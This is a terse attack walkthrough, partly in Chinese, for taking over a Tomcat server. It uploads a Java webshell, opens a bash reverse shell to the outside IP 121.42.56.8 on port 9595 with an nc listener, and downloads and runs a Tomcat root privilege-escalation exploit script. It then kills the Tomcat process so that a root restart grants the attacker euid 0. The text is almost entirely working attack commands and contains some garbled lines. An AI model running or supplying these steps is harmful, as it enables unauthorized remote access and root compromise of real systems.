0x001  

upload java webshell


0x002

mkdir  /tmp/pwn &&cd /tmp/pwn

vi reverse_shell.sh
/bin/bash  -i >/dev/tcp/121.42.56.8/9595 0<&1 2>&1

chmod 777 /tmp/pwn/reverse_shell.sh

setsid /tmp/pwn/reverse_shell.sh


0x003

nc -lvvp 9595


0x004

mkdir wget http://legalhackers.com/exploits/tomcat-rootprivesc-deb.sh   && chmod 777  tomcat-rootprivesc-deb.sh

ls -lah /var/log/tomcat7/   
check file exist catalina.out   tomcat7:root


0x005

[!] Exploit usage: 

./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]




./tomcat-rootprivesc-deb.sh /var/log/tomcat7/catalina.out

(Then waiting for a few seconds)


0x006 

ps -ef |grep java   (/usb/lib/jvm/default -java -Djava.util.loggs) 干掉tomocat 服务的进程

kill -9  pid

jspshell.jsp?comm6=ps

等待root用户重启tomcat进程.攻击者就可以提升权限了，euid变成euid=0(root)

ls -lahd /tmp/tomcatrootsh


